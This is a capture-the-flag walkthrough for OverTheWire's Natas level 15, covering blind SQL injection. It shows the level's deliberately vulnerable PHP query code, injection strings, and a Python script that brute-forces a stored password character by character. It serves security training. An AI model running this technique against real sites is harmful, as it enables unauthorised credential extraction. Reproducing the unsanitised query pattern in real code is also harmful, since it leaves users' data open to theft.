# Natas 15 -> 16

```
http://natas15.natas.labs.overthewire.org
```

```
Username: natas15
```

This time we have a form that checks the existence of a user, also the source code:

```php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? }
```

Let's try again the same sqli from the previous level

```
?username=q" or 1="1
```

Works.  
What about...

```
?username=natas16
```

Yep. ` This user exists.`  
But that's not what we're after. Since we already know that the table `users` has a column `username` and a column `password`, let's try...

```
?username=natas16%22%20AND%20password%20LIKE%20%22%c%&debug=1
```

Great. That prints

```
Executing query: SELECT * from users where username="natas16" AND password LIKE "%c%"
This user exists.
```

So basically we need to *bruteforce* our way into `natas16`.  
Hint: so far the passwords had a length of 32 chars.

```python
#!/usr/bin/env python

import string
import requests

url = 'http://natas15.natas.labs.overthewire.org/'
http_user = 'natas15'
http_pass = ''

bf_passwd = ""
bf_dict = string.ascii_letters + string.digits

while len(bf_passwd) != 32:
    for char in bf_dict:
        r = requests.get(url,
                         params={
                             'username': 'natas16" AND password LIKE "{}%'.format(bf_passwd + char)
                         },
                         auth=(http_user, http_pass))
        if "This user exists." in r.text:
            bf_passwd += char
            if len(bf_passwd) == 32:
                break

print "Password: {}".format(bf_passwd)
```


* php
* mysql_connect
* sqli
